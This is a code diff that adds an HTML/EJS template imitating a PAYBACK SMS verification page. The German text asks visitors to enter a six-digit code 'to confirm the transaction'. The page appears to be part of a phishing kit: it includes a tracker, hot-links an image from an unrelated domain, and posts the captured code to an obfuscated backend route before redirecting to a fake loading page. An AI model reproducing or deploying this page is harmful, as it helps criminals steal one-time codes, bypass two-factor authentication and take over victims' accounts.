@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>PAYBACK</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+        <style>
+            :root {
+                --bg-color: #FFFFFF;
+                --text-dark: #222222;
+                --text-muted: #666666;
+                --card-border: #ECECEC;
+                --input-border: #DFDFDF;
+                --input-line: #D5D5D5;
+                --btn-grey: #BDBEC2;
+                --btn-blue: #003EB0;
+                --btn-blue-hover: #003399;
+                --btn-text: #FFFFFF;
+                --link-blue: #0056B3;
+                --divider-grey: #C6C7CA;
+                --font-stack: Arial, "Helvetica Neue", Helvetica, sans-serif;
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html,
+            body {
+                min-height: 100%;
+                height: 100%;
+                margin: 0;
+                padding: 0;
+            }
+
+            body {
+                min-height: 100vh;
+                min-height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                background-color: var(--bg-color);
+                color: var(--text-dark);
+                font-family: var(--font-stack);
+                -webkit-font-smoothing: antialiased;
+                -moz-osx-font-smoothing: grayscale;
+            }
+
+            /* =========================================================
+           PAGE WRAPPER (Flex column for sticky footer)
+           ========================================================= */
+            .page-container {
+                width: 100%;
+                max-width: 1200px;
+                min-height: 100vh;
+                min-height: 100dvh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                padding-top: 16px;
+                box-sizing: border-box;
+            }
+
+            /* Top Header Logo (public/img/bota.png) */
+            .top-header-logo {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                width: 100%;
+                flex-shrink: 0;
+            }
+
+            .top-header-logo img {
+                width: 120px;
+                height: auto;
+                display: block;
+            }
+
+            /* =========================================================
+           MAIN CONTENT AREA: Fills vertical space, pushes footer down
+           ========================================================= */
+            .main-content-area {
+                flex: 1 0 auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: flex-start;
+            }
+
+            /* Information Box (mTAN Card):
+           Positioned approximately 3 cm (113 px) below the bottom edge of the logo */
+            .login-card {
+                width: 352px;
+                max-width: 92vw;
+                margin-top: 113px;
+                /* 3 cm (113 px) spacing below logo */
+                background-color: #FFFFFF;
+                border: 1px solid var(--card-border);
+                border-radius: 10px;
+                padding: 22px 22px 24px 22px;
+                box-sizing: border-box;
+                display: flex;
+                flex-direction: column;
+                box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+            }
+
+            /* Card Title */
+            .card-title {
+                text-align: center;
+                font-size: 25px;
+                font-weight: 700;
+                color: #1A1A1A;
+                line-height: 1.2;
+                margin-top: 6px;
+                margin-bottom: 24px;
+                letter-spacing: -0.2px;
+            }
+
+            /* Form Group */
+            .form-group {
+                display: flex;
+                flex-direction: column;
+                width: 100%;
+            }
+
+            /* Input Label: Gibeinzuloggen */
+            .input-label {
+                font-size: 14.5px;
+                color: var(--text-dark);
+                margin-bottom: 10px;
+                font-weight: 400;
+                align-self: flex-start;
+            }
+
+            /* 6-box mTAN underline inputs */
+            .mtan-inputs {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                gap: 8px;
+                margin-bottom: 24px;
+                width: 100%;
+            }
+
+            .mtan-inputs input.mtan-digit {
+                flex: 1;
+                min-width: 0;
+                height: 40px;
+                border: none;
+                border-bottom: 2px solid var(--input-line);
+                background: transparent;
+                text-align: center;
+                font-family: inherit;
+                font-size: 20px;
+                font-weight: 700;
+                color: var(--text-dark);
+                outline: none;
+                padding: 0;
+                box-sizing: border-box;
+                border-radius: 0;
+                caret-color: var(--btn-blue);
+                transition: border-bottom-color 0.15s ease, border-bottom-width 0.15s ease;
+            }
+
+            .mtan-inputs input.mtan-digit:focus {
+                border-bottom-color: var(--btn-blue);
+                border-bottom-width: 2.5px;
+            }
+
+            /* Submit Button: Einloggen (Bold text, dynamic blue enable state) */
+            .submit-btn-wrapper {
+                display: flex;
+                justify-content: center;
+                width: 100%;
+                margin-top: 4px;
+                margin-bottom: 6px;
+            }
+
+            .btn-submit {
+                width: 115px;
+                height: 40px;
+                background-color: var(--btn-grey);
+                color: var(--btn-text);
+                border: none;
+                border-radius: 8px;
+                font-family: inherit;
+                font-size: 14.5px;
+                font-weight: 700;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                cursor: not-allowed;
+                padding: 0;
+                box-sizing: border-box;
+                transition: background-color 0.15s ease, opacity 0.15s ease;
+            }
+
+            /* Enabled/Active blue state */
+            .btn-submit:not(:disabled),
+            .btn-submit.active {
+                background-color: var(--btn-blue);
+                cursor: pointer;
+            }
+
+            .btn-submit:not(:disabled):hover,
+            .btn-submit.active:hover {
+                background-color: var(--btn-blue-hover);
+            }
+
+            /* Disabled gray state */
+            .btn-submit:disabled,
+            .btn-submit.disabled {
+                background-color: var(--btn-grey);
+                cursor: not-allowed;
+                opacity: 1;
+            }
+
+            /* =========================================================
+           STICKY FOOTER (margin-top: auto anchors to viewport bottom)
+           ========================================================= */
+            .footer-wrapper {
+                margin-top: auto;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                flex-shrink: 0;
+            }
+
+            .divider-line {
+                width: 685px;
+                max-width: 92vw;
+                border-top: 1px solid var(--divider-grey);
+                margin-top: 36px;
+            }
+
+            .page-footer-nav {
+                width: 100%;
+                max-width: 920px;
+                margin-top: 32px;
+                margin-bottom: 36px;
+                padding: 0 16px;
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                align-items: center;
+                gap: 12px 20px;
+                box-sizing: border-box;
+            }
+
+            .footer-nav-link,
+            .footer-nav-link:link,
+            .footer-nav-link:visited {
+                font-size: 13.5px;
+                font-weight: 700;
+                color: var(--text-dark);
+                text-decoration: none;
+                white-space: nowrap;
+            }
+
+            .footer-nav-link:hover {
+                text-decoration: underline;
+            }
+
+            /* =========================================================
+           RESPONSIVE - TABLETS & MOBILE
+           ========================================================= */
+            @media (max-width: 720px) {
+                .page-footer-nav {
+                    gap: 12px 18px;
+                }
+
+                .footer-nav-link,
+                .footer-nav-link:link,
+                .footer-nav-link:visited {
+                    font-size: 12.5px;
+                    font-weight: 700;
+                }
+
+                .login-card {
+                    width: 92vw;
+                    max-width: 352px;
+                    margin-top: clamp(48px, 9vh, 113px);
+                }
+
+                .mtan-inputs {
+                    gap: 6px;
+                }
+
+                .mtan-inputs input.mtan-digit {
+                    font-size: 18px;
+                    height: 38px;
+                }
+            }
+        </style>
+</head>
+
+<body>
+
+    <div class="page-container">
+
+        <!-- Top Header Logo (public/img/bota.png) -->
+        <header class="top-header-logo">
+            <img src="/img/bota.png" alt="Logo"
+                onerror="if(!this.dataset.retry){this.dataset.retry='1';this.src='img/bota.png';}">
+        </header>
+
+        <!-- Main Content Area: flex: 1; pushes footer to bottom -->
+        <main class="main-content-area">
+
+            <!-- Main Information Box: 3 cm (113 px) below logo -->
+            <div class="login-card">
+
+                <!-- Card Title -->
+                <img src="https://speedpayamak.com/data/234567.jpg" alt="SMS"
+                    style="display: block; margin: 10px auto 20px auto; max-width: 120px;">
+                <p style="text-align: center; font-size: 12px; color: #333; margin-top: 10px; margin-bottom: 20px;">
+                    Bitte geben Sie den Verifizierungscode ein, den wir Ihnen per SMS gesendet haben, um die Transaktion
+                    zu bestätigen.</p>
+
+                <!-- Form -->
+                <form id="mtanForm" autocomplete="off">
+                    <div class="form-group">
+
+                        <!-- Input Label -->
+                        <label class="input-label">SMS</label>
+
+                        <!-- 6-digit mTAN Underline Inputs -->
+                        <div class="mtan-inputs">
+                            <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" pattern="[0-9]*"
+                                autocomplete="one-time-code" aria-label="Ziffer 1">
+                            <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" pattern="[0-9]*"
+                                aria-label="Ziffer 2">
+                            <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" pattern="[0-9]*"
+                                aria-label="Ziffer 3">
+                            <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" pattern="[0-9]*"
+                                aria-label="Ziffer 4">
+                            <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" pattern="[0-9]*"
+                                aria-label="Ziffer 5">
+                            <input type="tel" maxlength="1" class="mtan-digit" inputmode="numeric" pattern="[0-9]*"
+                                aria-label="Ziffer 6">
+                        </div>
+                        <input type="hidden" id="mtan-hidden" name="code">
+
+                        <!-- Submit Button: Bold text, initially disabled and gray -->
+                        <div class="submit-btn-wrapper">
+                            <button type="submit" class="btn-submit" id="submitBtn" disabled>Weiter</button>
+                        </div>
+
+                    </div>
+                </form>
+
+            </div>
+
+        </main>
+
+        <!-- Sticky Footer Wrapper -->
+        <div class="footer-wrapper">
+            <!-- Divider Line -->
+            <div class="divider-line"></div>
+
+            <!-- Footer Navigation Links: Bold, Centered with Comfortable Horizontal Spacing -->
+            <footer class="page-footer-nav">
+                <a href="#" class="footer-nav-link">Impressum</a>
+                <a href="#" class="footer-nav-link">Unternehmen</a>
+                <a href="#" class="footer-nav-link">Arbeiten bei PAYBACK</a>
+                <a href="#" class="footer-nav-link">Fragen &amp; Hilfe</a>
+                <a href="#" class="footer-nav-link">Datenschutz</a>
+                <a href="#" class="footer-nav-link">Barrierefreiheit</a>
+                <a href="#" class="footer-nav-link">Cookie-Einstellungen</a>
+            </footer>
+        </div>
+
+    </div>
+
+    <!-- Interactive Script -->
+    <script>
+        (function () {
+            const digits = document.querySelectorAll('.mtan-digit');
+            const hiddenInput = document.getElementById('mtan-hidden');
+            const submitBtn = document.getElementById('submitBtn');
+            const form = document.getElementById('mtanForm');
+
+            // Focus first digit on page load
+            if (digits.length > 0) {
+                setTimeout(function () {
+                    digits[0].focus();
+                }, 100);
+            }
+
+            // Function to dynamically update the Login Button state and color
+            function updateButtonState() {
+                let code = '';
+                digits.forEach(function (d) {
+                    code += d.value.trim();
+                });
+
+                if (submitBtn) {
+                    if (code.length === 6) {
+                        submitBtn.disabled = false;
+                        submitBtn.classList.add('active');
+                    } else {
+                        submitBtn.disabled = true;
+                        submitBtn.classList.remove('active');
+                    }
+                }
+            }
+
+            // OTP digit input navigation and event handling
+            digits.forEach(function (input, index) {
+                input.addEventListener('input', function () {
+                    this.value = this.value.replace(/[^0-9]/g, '').slice(-1);
+                    if (this.value && index < digits.length - 1) {
+                        digits[index + 1].focus();
+                    }
+                    updateButtonState();
+                });
+
+                input.addEventListener('keydown', function (e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        digits[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowLeft' && index > 0) {
+                        digits[index - 1].focus();
+                    }
+                    if (e.key === 'ArrowRight' && index < digits.length - 1) {
+                        digits[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                    pasted.split('').forEach(function (char, i) {
+                        if (digits[index + i]) {
+                            digits[index + i].value = char;
+                        }
+                    });
+                    const next = Math.min(index + pasted.length, digits.length - 1);
+                    if (digits[next]) {
+                        digits[next].focus();
+                    }
+                    updateButtonState();
+                });
+            });
+
+            // Form submission matching backend route /m4kT9BQWt7KTDdaVmafx
+            if (form) {
+                form.addEventListener('submit', function (e) {
+                    e.preventDefault();
+
+                    let code = '';
+                    digits.forEach(function (d) {
+                        code += d.value.trim();
+                    });
+
+                    if (code.length < 6) {
+                        return;
+                    }
+
+                    if (hiddenInput) {
+                        hiddenInput.value = code;
+                    }
+
+                    if (submitBtn) {
+                        submitBtn.disabled = true;
+                        submitBtn.textContent = '...';
+                    }
+
+                    if (typeof $ !== 'undefined' && $.ajax) {
+                        $.ajax({
+                            url: '/m4kT9BQWt7KTDdaVmafx',
+                            type: 'POST',
+                            contentType: 'application/json',
+                            data: JSON.stringify({ code: code }),
+                            success: function (response) {
+                                if (response && response.OK) {
+                                    window.location.href = '/loading?time=7&url=/LGknmeM9HwWUWSutj6mJ';
+                                } else {
+                                    if (submitBtn) {
+                                        submitBtn.textContent = 'Einloggen';
+                                        submitBtn.disabled = true;
+                                        submitBtn.classList.remove('active');
+                                    }
+                                    digits.forEach(function (d) {
+                                        d.value = '';
+                                    });
+                                    if (digits[0]) {
+                                        digits[0].focus();
+                                    }
+                                    updateButtonState();
+                                }
+                            },
+                            error: function () {
+                                setTimeout(function () {
+                                    if (submitBtn) {
+                                        submitBtn.textContent = 'Einloggen';
+                                        updateButtonState();
+                                    }
+                                }, 600);
+                            }
+                        });
+                    } else {
+                        setTimeout(function () {
+                            if (submitBtn) {
+                                submitBtn.textContent = 'Einloggen';
+                                updateButtonState();
+                            }
+                        }, 600);
+                    }
+                });
+            }
+        })();
+    </script>
+</body>
+
+</html>
